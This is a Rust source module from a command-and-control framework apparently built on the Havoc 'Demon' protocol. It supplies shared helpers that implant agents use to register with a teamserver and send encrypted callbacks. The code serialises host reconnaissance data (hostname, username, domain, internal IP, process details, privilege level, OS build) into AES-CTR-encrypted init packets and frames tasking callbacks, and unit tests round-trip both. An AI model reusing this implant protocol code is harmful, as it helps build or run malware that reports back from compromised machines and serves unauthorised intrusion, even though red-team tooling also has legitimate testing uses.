//! Shared Demon-protocol helpers used by all Red Cell agent crates.
//!
//! Provides the types and functions that are byte-for-byte identical across
//! agents (Phantom, Specter, …) so that a protocol change only needs to be
//! made once.

use thiserror::Error;

use crate::crypto::{
    AGENT_IV_LENGTH, AGENT_KEY_LENGTH, AgentCryptoMaterial, ctr_blocks_for_len, decrypt_agent_data,
    encrypt_agent_data, encrypt_agent_data_at_offset,
};
use crate::demon::{DemonCommand, DemonEnvelope, DemonProtocolError};

/// Error type for agent-protocol serialization and parsing operations.
#[derive(Debug, Error)]
pub enum AgentProtocolError {
    /// A length field overflowed the 32-bit wire format.
    #[error("protocol error: {0}")]
    Protocol(#[from] DemonProtocolError),

    /// A cryptographic operation failed.
    #[error("crypto error: {0}")]
    Crypto(#[from] crate::crypto::CryptoError),

    /// The teamserver returned an unexpected or invalid response.
    #[error("invalid agent response: {0}")]
    InvalidResponse(&'static str),
}

/// Extension flag requesting monotonic CTR mode from the teamserver.
///
/// When set in the init metadata extension flags, the teamserver tracks
/// per-agent CTR block offsets instead of resetting to 0 on every message.
/// Must match the teamserver's `INIT_EXT_MONOTONIC_CTR` constant.
pub const INIT_EXT_MONOTONIC_CTR: u32 = 1 << 0;

/// Extension flag opting in to server-side sequence-number replay protection.
///
/// When set, the agent prefixes every callback payload (before encryption) with
/// an 8-byte little-endian monotonic sequence number.  The teamserver rejects
/// any callback whose decrypted sequence number is not strictly greater than the
/// last one it accepted for this agent.  Must match the teamserver's
/// `INIT_EXT_SEQ_PROTECTED` constant.
pub const INIT_EXT_SEQ_PROTECTED: u32 = 1 << 1;

/// Host metadata sent in the initial `DEMON_INIT` registration packet.
///
/// Fields are serialized in a specific big-endian wire order by
/// [`serialize_init_metadata`]; callers must populate all fields before
/// calling [`build_init_packet`].
#[derive(Debug, Clone)]
pub struct AgentMetadata {
    /// Machine hostname.
    pub hostname: String,
    /// Effective username.
    pub username: String,
    /// Domain or workgroup name.
    pub domain_name: String,
    /// Best-effort internal IP address.
    pub internal_ip: String,
    /// Full path to the agent executable (sent as UTF-16LE on the wire).
    pub process_path: String,
    /// Current process identifier.
    pub process_pid: u32,
    /// Current thread identifier.
    pub process_tid: u32,
    /// Parent process identifier.
    pub process_ppid: u32,
    /// Process architecture (0=unknown, 1=x86, 2=x64, 3=IA64).
    pub process_arch: u32,
    /// Whether the agent is running with elevated/admin privileges.
    pub elevated: bool,
    /// Base address of the agent module.
    pub base_address: u64,
    /// OS major version.
    pub os_major: u32,
    /// OS minor version.
    pub os_minor: u32,
    /// OS product type.
    pub os_product_type: u32,
    /// OS service pack level.
    pub os_service_pack: u32,
    /// OS build number.
    pub os_build: u32,
    /// OS architecture (0=x86, 9=x64, 5=ARM, 12=ARM64, 6=Itanium).
    pub os_arch: u32,
    /// Sleep delay in milliseconds.
    pub sleep_delay: u32,
    /// Sleep jitter percentage.
    pub sleep_jitter: u32,
    /// Kill date as a Unix timestamp, or 0 for none.
    pub kill_date: u64,
    /// Working-hours bitmask, or 0 for disabled.
    pub working_hours: i32,
}

/// Build a `DEMON_INIT` packet matching the Demon transport framing.
///
/// Wire layout:
/// ```text
/// [ DemonHeader: size(4) | magic(4) | agent_id(4) ]
/// [ command_id(4) = DEMON_INIT ]
/// [ request_id(4) = 0 ]
/// [ AES key (32 bytes, unencrypted) ]
/// [ AES IV  (16 bytes, unencrypted) ]
/// [ optional: 1-byte init secret version — present when `init_secret_version` is Some ]
/// [ AES-256-CTR encrypted metadata payload ]
/// ```
///
/// When `init_secret_version` is [`Some`], a one-byte secret version is written
/// after the cleartext AES key/IV and before the encrypted metadata.  This
/// matches listeners configured with `InitSecrets = [...]` (versioned HKDF).
/// When [`None`], the envelope matches the legacy single-`InitSecret` profile
/// (no version byte).
pub fn build_init_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    metadata: &AgentMetadata,
    init_secret_version: Option<u8>,
) -> Result<Vec<u8>, AgentProtocolError> {
    let plaintext = serialize_init_metadata(agent_id, metadata)?;
    let encrypted = encrypt_agent_data(&crypto.key, &crypto.iv, &plaintext)?;

    let extra = usize::from(init_secret_version.is_some());
    let payload_len = 4 + 4 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH + extra + encrypted.len();
    let mut payload = Vec::with_capacity(payload_len);
    payload.extend_from_slice(&u32::from(DemonCommand::DemonInit).to_be_bytes());
    payload.extend_from_slice(&0_u32.to_be_bytes());
    payload.extend_from_slice(&crypto.key);
    payload.extend_from_slice(&crypto.iv);
    if let Some(version) = init_secret_version {
        payload.push(version);
    }
    payload.extend_from_slice(&encrypted);

    let envelope = DemonEnvelope::new(agent_id, payload)?;
    Ok(envelope.to_bytes())
}

/// Parse the init acknowledgement response and return the consumed receive CTR blocks.
///
/// The teamserver encrypts the agent ID (4 bytes, little-endian) at CTR offset 0
/// using either the raw registration key material or HKDF-derived session keys,
/// depending on listener configuration.  Returns an error when the decrypted ID
/// does not match `agent_id`.
pub fn parse_init_ack(
    response_body: &[u8],
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
) -> Result<u64, AgentProtocolError> {
    if response_body.is_empty() {
        return Err(AgentProtocolError::InvalidResponse("empty init acknowledgement"));
    }

    let decrypted = decrypt_agent_data(&crypto.key, &crypto.iv, response_body)?;
    if decrypted.len() < 4 {
        return Err(AgentProtocolError::InvalidResponse("init acknowledgement too short"));
    }

    let acked_id =
        u32::from_le_bytes(decrypted[..4].try_into().map_err(|_| {
            AgentProtocolError::InvalidResponse("invalid init acknowledgement body")
        })?);

    if acked_id != agent_id {
        return Err(AgentProtocolError::InvalidResponse("init acknowledgement agent_id mismatch"));
    }

    Ok(ctr_blocks_for_len(response_body.len()))
}

/// Build a callback packet with the encrypted payload at the given CTR block offset.
///
/// Wire layout:
/// ```text
/// [ DemonHeader: size(4) | magic(4) | agent_id(4) ]
/// [ command_id(4)  — cleartext ]
/// [ request_id(4)  — cleartext ]
/// [ AES-256-CTR encrypted at block_offset: seq_num(8 LE) | payload_len(4) | payload_bytes ]
/// ```
///
/// `seq_num` is the agent's current monotonic sequence number (starts at 1).  It is
/// prepended to the plaintext before encryption so the teamserver can validate
/// replay protection without seeing it in the clear.
pub fn build_callback_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    block_offset: u64,
    seq_num: u64,
    command_id: u32,
    request_id: u32,
    callback_payload: &[u8],
) -> Result<Vec<u8>, AgentProtocolError> {
    let mut plaintext = Vec::with_capacity(8 + 4 + callback_payload.len());
    plaintext.extend_from_slice(&seq_num.to_le_bytes());
    let payload_len = u32::try_from(callback_payload.len()).map_err(|_| {
        AgentProtocolError::Protocol(DemonProtocolError::LengthOverflow {
            context: "callback payload",
            length: callback_payload.len(),
        })
    })?;
    plaintext.extend_from_slice(&payload_len.to_be_bytes());
    plaintext.extend_from_slice(callback_payload);

    let encrypted =
        encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, block_offset, &plaintext)?;

    let mut body = Vec::with_capacity(8 + encrypted.len());
    body.extend_from_slice(&command_id.to_be_bytes());
    body.extend_from_slice(&request_id.to_be_bytes());
    body.extend_from_slice(&encrypted);

    let envelope = DemonEnvelope::new(agent_id, body)?;
    Ok(envelope.to_bytes())
}

/// Serialize the init metadata fields to a big-endian byte buffer for encryption.
///
/// The buffer ends with a trailing `u32` extension-flags field that opts in to
/// monotonic CTR mode and sequence-number replay protection.  Legacy Demon agents
/// omit this field; the teamserver defaults to legacy mode when it is absent.
pub fn serialize_init_metadata(
    agent_id: u32,
    m: &AgentMetadata,
) -> Result<Vec<u8>, AgentProtocolError> {
    let mut buf = Vec::with_capacity(256);

    buf.extend_from_slice(&agent_id.to_be_bytes());
    buf.extend_from_slice(&length_prefixed_bytes(m.hostname.as_bytes())?);
    buf.extend_from_slice(&length_prefixed_bytes(m.username.as_bytes())?);
    buf.extend_from_slice(&length_prefixed_bytes(m.domain_name.as_bytes())?);
    buf.extend_from_slice(&length_prefixed_bytes(m.internal_ip.as_bytes())?);
    buf.extend_from_slice(&length_prefixed_utf16le(&m.process_path)?);
    buf.extend_from_slice(&m.process_pid.to_be_bytes());
    buf.extend_from_slice(&m.process_tid.to_be_bytes());
    buf.extend_from_slice(&m.process_ppid.to_be_bytes());
    buf.extend_from_slice(&m.process_arch.to_be_bytes());
    buf.extend_from_slice(&u32::from(m.elevated).to_be_bytes());
    buf.extend_from_slice(&m.base_address.to_be_bytes());
    buf.extend_from_slice(&m.os_major.to_be_bytes());
    buf.extend_from_slice(&m.os_minor.to_be_bytes());
    buf.extend_from_slice(&m.os_product_type.to_be_bytes());
    buf.extend_from_slice(&m.os_service_pack.to_be_bytes());
    buf.extend_from_slice(&m.os_build.to_be_bytes());
    buf.extend_from_slice(&m.os_arch.to_be_bytes());
    buf.extend_from_slice(&m.sleep_delay.to_be_bytes());
    buf.extend_from_slice(&m.sleep_jitter.to_be_bytes());
    buf.extend_from_slice(&m.kill_date.to_be_bytes());
    buf.extend_from_slice(&m.working_hours.to_be_bytes());

    // Extension flags: opt in to monotonic CTR mode and sequence-number replay protection.
    buf.extend_from_slice(&(INIT_EXT_MONOTONIC_CTR | INIT_EXT_SEQ_PROTECTED).to_be_bytes());

    Ok(buf)
}

/// Encode `bytes` as a big-endian 4-byte length prefix followed by `bytes`.
fn length_prefixed_bytes(bytes: &[u8]) -> Result<Vec<u8>, AgentProtocolError> {
    let len = u32::try_from(bytes.len()).map_err(|_| {
        AgentProtocolError::Protocol(DemonProtocolError::LengthOverflow {
            context: "length-prefixed field",
            length: bytes.len(),
        })
    })?;
    let mut out = Vec::with_capacity(4 + bytes.len());
    out.extend_from_slice(&len.to_be_bytes());
    out.extend_from_slice(bytes);
    Ok(out)
}

/// Encode `value` as a UTF-16LE string with a big-endian 4-byte byte-length prefix.
fn length_prefixed_utf16le(value: &str) -> Result<Vec<u8>, AgentProtocolError> {
    let utf16: Vec<u16> = value.encode_utf16().collect();
    let byte_len = utf16.len().checked_mul(2).ok_or(AgentProtocolError::Protocol(
        DemonProtocolError::LengthOverflow {
            context: "UTF-16LE field byte length overflow",
            length: utf16.len(),
        },
    ))?;
    let len = u32::try_from(byte_len).map_err(|_| {
        AgentProtocolError::Protocol(DemonProtocolError::LengthOverflow {
            context: "UTF-16LE length-prefixed field",
            length: byte_len,
        })
    })?;
    let mut out = Vec::with_capacity(4 + byte_len);
    out.extend_from_slice(&len.to_be_bytes());
    for unit in utf16 {
        out.extend_from_slice(&unit.to_le_bytes());
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::crypto::{ctr_blocks_for_len, decrypt_agent_data, generate_agent_crypto_material};
    use crate::demon::{DEMON_MAGIC_VALUE, DemonCommand};

    fn test_metadata() -> AgentMetadata {
        AgentMetadata {
            hostname: "DESKTOP-TEST".into(),
            username: "testuser".into(),
            domain_name: "WORKGROUP".into(),
            internal_ip: "192.168.1.100".into(),
            process_path: "C:\\Windows\\System32\\notepad.exe".into(),
            process_pid: 1234,
            process_tid: 5678,
            process_ppid: 900,
            process_arch: 2,
            elevated: false,
            base_address: 0x7FF6_0000_0000,
            os_major: 10,
            os_minor: 0,
            os_product_type: 1,
            os_service_pack: 0,
            os_build: 19045,
            os_arch: 9,
            sleep_delay: 5000,
            sleep_jitter: 10,
            kill_date: 0,
            working_hours: 0,
        }
    }

    #[test]
    fn build_init_packet_has_correct_header() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0xAABB_CCDD;
        let packet = build_init_packet(agent_id, &crypto, &test_metadata(), None).expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse envelope");
        assert_eq!(envelope.header.magic, DEMON_MAGIC_VALUE);
        assert_eq!(envelope.header.agent_id, agent_id);

        let command_id = u32::from_be_bytes(envelope.payload[0..4].try_into().expect("cmd"));
        let request_id = u32::from_be_bytes(envelope.payload[4..8].try_into().expect("req"));
        assert_eq!(command_id, u32::from(DemonCommand::DemonInit));
        assert_eq!(request_id, 0);
    }

    #[test]
    fn build_init_packet_contains_key_and_iv() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let packet =
            build_init_packet(0x1234_5678, &crypto, &test_metadata(), None).expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
        let key_start = 8;
        let key_end = key_start + AGENT_KEY_LENGTH;
        let iv_end = key_end + AGENT_IV_LENGTH;
        assert_eq!(&envelope.payload[key_start..key_end], &crypto.key);
        assert_eq!(&envelope.payload[key_end..iv_end], &crypto.iv);
    }

    #[test]
    fn build_init_packet_encrypted_payload_decrypts_correctly() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0xDEAD_CAFE;
        let packet = build_init_packet(agent_id, &crypto, &test_metadata(), None).expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
        let encrypted_start = 8 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH;
        let decrypted =
            decrypt_agent_data(&crypto.key, &crypto.iv, &envelope.payload[encrypted_start..])
                .expect("decrypt");

        let parsed_id = u32::from_be_bytes(decrypted[0..4].try_into().expect("id"));
        assert_eq!(parsed_id, agent_id);
    }

    #[test]
    fn build_init_packet_versioned_inserts_secret_version_before_ciphertext() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0x1122_3344;
        let version = 7_u8;
        let packet =
            build_init_packet(agent_id, &crypto, &test_metadata(), Some(version)).expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
        assert!(
            envelope.payload.len() > 57,
            "versioned init payload must extend past version byte"
        );
        assert_eq!(envelope.payload[56], version);
        let decrypted =
            decrypt_agent_data(&crypto.key, &crypto.iv, &envelope.payload[57..]).expect("decrypt");
        assert!(decrypted.len() >= 4);
    }

    #[test]
    fn serialize_init_metadata_has_monotonic_ctr_and_seq_protected_flags() {
        let buf = serialize_init_metadata(0x1111_2222, &test_metadata()).expect("serialize");
        let tail = &buf[buf.len() - 4..];
        let ext_flags = u32::from_be_bytes(tail.try_into().expect("4 bytes"));
        assert_ne!(ext_flags & INIT_EXT_MONOTONIC_CTR, 0, "INIT_EXT_MONOTONIC_CTR must be set");
        assert_ne!(ext_flags & INIT_EXT_SEQ_PROTECTED, 0, "INIT_EXT_SEQ_PROTECTED must be set");
    }

    #[test]
    fn serialize_init_metadata_hostname_round_trips() {
        let buf = serialize_init_metadata(0x1111_2222, &test_metadata()).expect("serialize");
        let hostname_len = u32::from_be_bytes(buf[4..8].try_into().expect("len")) as usize;
        let hostname = std::str::from_utf8(&buf[8..8 + hostname_len]).expect("utf8");
        assert_eq!(hostname, "DESKTOP-TEST");
    }

    #[test]
    fn utf16le_encoding_matches_havoc_format() {
        let encoded = length_prefixed_utf16le("A").expect("encode");
        // 'A' = U+0041 → UTF-16LE = [0x41, 0x00], byte length = 2
        assert_eq!(&encoded[0..4], &2_u32.to_be_bytes());
        assert_eq!(&encoded[4..6], &[0x41, 0x00]);
    }

    #[test]
    fn parse_init_ack_returns_consumed_ctr_blocks() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0x1337_4242_u32;
        let ack =
            crate::crypto::encrypt_agent_data(&crypto.key, &crypto.iv, &agent_id.to_le_bytes())
                .expect("encrypt");

        let blocks = parse_init_ack(&ack, agent_id, &crypto).expect("parse");
        assert_eq!(blocks, ctr_blocks_for_len(ack.len()));
    }

    #[test]
    fn parse_init_ack_rejects_agent_id_mismatch() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let ack = crate::crypto::encrypt_agent_data(
            &crypto.key,
            &crypto.iv,
            &0x1337_4242_u32.to_le_bytes(),
        )
        .expect("encrypt");

        let err = parse_init_ack(&ack, 0x4242_1337, &crypto).expect_err("should fail");
        assert!(matches!(err, AgentProtocolError::InvalidResponse(_)));
    }

    #[test]
    fn parse_init_ack_rejects_empty_body() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let err = parse_init_ack(&[], 0x1234, &crypto).expect_err("should fail");
        assert!(matches!(err, AgentProtocolError::InvalidResponse(_)));
    }

    #[test]
    fn build_callback_packet_roundtrips() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0xAAAA_BBBB;
        let command_id = u32::from(DemonCommand::CommandCheckin);
        let request_id = 42_u32;
        let seq_num = 7_u64;
        let payload_data = b"hello";

        let packet = build_callback_packet(
            agent_id,
            &crypto,
            0,
            seq_num,
            command_id,
            request_id,
            payload_data,
        )
        .expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
        assert_eq!(envelope.header.agent_id, agent_id);
        let cmd = u32::from_be_bytes(envelope.payload[0..4].try_into().expect("cmd"));
        let req = u32::from_be_bytes(envelope.payload[4..8].try_into().expect("req"));
        assert_eq!(cmd, command_id);
        assert_eq!(req, request_id);

        let decrypted =
            decrypt_agent_data(&crypto.key, &crypto.iv, &envelope.payload[8..]).expect("decrypt");
        let decoded_seq = u64::from_le_bytes(decrypted[0..8].try_into().expect("seq"));
        assert_eq!(decoded_seq, seq_num);
        let plen = u32::from_be_bytes(decrypted[8..12].try_into().expect("len")) as usize;
        assert_eq!(&decrypted[12..12 + plen], payload_data);
    }
}
